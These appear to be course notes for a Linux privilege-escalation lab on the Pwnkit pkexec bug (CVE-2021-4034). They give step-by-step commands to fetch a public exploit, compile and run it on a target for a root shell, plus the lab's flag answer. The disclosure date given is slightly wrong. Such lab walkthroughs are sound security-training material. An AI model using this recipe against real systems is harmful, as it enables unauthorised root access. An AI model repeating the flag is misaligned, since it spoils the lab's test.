## ID
531

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 24 — Polkit

## Description
Covers privilege escalation via the Pwnkit vulnerability (CVE-2021-4034), a memory corruption bug in polkit's `pkexec` utility that yields an instant root shell on most Linux systems.

## Tags
polkit, pkexec, pwnkit, cve-2021-4034, privilege-escalation, linux

## Commands
- `pkexec -u root id`
- `git clone https://github.com/arthepsy/CVE-2021-4034.git`
- `scp -r CVE-2021-4034/ htb-student@<TARGET_IP>:~/`
- `gcc cve-2021-4034-poc.c -o poc`
- `chmod +x poc`
- `./poc`
- `cat /root/flag.txt`

## What This Section Covers
PolicyKit (polkit) is a Linux authorization service that mediates privilege requests between user software and system components. Its `pkexec` tool runs programs as another user (similar to sudo). CVE-2021-4034 (Pwnkit) is a memory corruption vulnerability in `pkexec` that was hidden for over 10 years, disclosed November 2021 and patched two months later — it gives instant root from any unprivileged user with no configuration prerequisites.

## Methodology
1. Confirm the target has a vulnerable `pkexec` (virtually all unpatched polkit installations before January 2022).
2. Clone the PoC on your attack box: `git clone https://github.com/arthepsy/CVE-2021-4034.git`.
3. Transfer the exploit to the target: `scp -r CVE-2021-4034/ htb-student@<TARGET_IP>:~/`.
4. SSH into the target and navigate to the exploit directory: `cd CVE-2021-4034/`.
5. Compile the exploit: `gcc cve-2021-4034-poc.c -o poc`.
6. Make it executable and run: `chmod +x poc && ./poc`.
7. You drop into a root shell (`#`). Read the flag: `cat /root/flag.txt`.

## Multi-step Workflow
```
# On attack box
git clone https://github.com/arthepsy/CVE-2021-4034.git
scp -r CVE-2021-4034/ htb-student@<TARGET_IP>:~/

# On target
ssh htb-student@<TARGET_IP>
cd CVE-2021-4034/
gcc cve-2021-4034-poc.c -o poc
chmod +x poc
./poc
cat /root/flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Escalate privileges and submit flag.txt | HTB{p0Lk1tt3n} | Clone CVE-2021-4034 PoC → scp to target → compile with gcc → run `./poc` → root shell → `cat /root/flag.txt` |

## Key Takeaways
- Pwnkit (CVE-2021-4034) requires zero configuration prerequisites — no sudo entry, no SUID misconfig, just an unpatched `pkexec` binary, making it one of the most reliable Linux privesc exploits.
- Unlike sudo exploits, polkit vulnerabilities don't depend on sudoers policy — any local user can exploit `pkexec` regardless of their sudo permissions.
- The exploit needs `gcc` on the target; if unavailable, cross-compile on a matching architecture and transfer the binary.
- Polkit has three key tools worth remembering: `pkexec` (run as another user), `pkaction` (list actions), `pkcheck` (check authorization) — `pkexec` is the one that matters for privesc.
- Like Baron Samedit, Pwnkit sat undetected for 10+ years — always check for these "legacy" CVEs even on seemingly hardened systems.

## Gotchas
- If the target has no `gcc`, you must compile the PoC externally on a system with the same architecture (x86_64 vs ARM) and transfer the compiled binary.
- The exploit drops you into `sh` not `bash` — run `bash` after exploitation if you need a full interactive shell.
- On patched systems (polkit ≥ 0.120 with the fix, or January 2022+ updates), this exploit will fail silently or segfault.
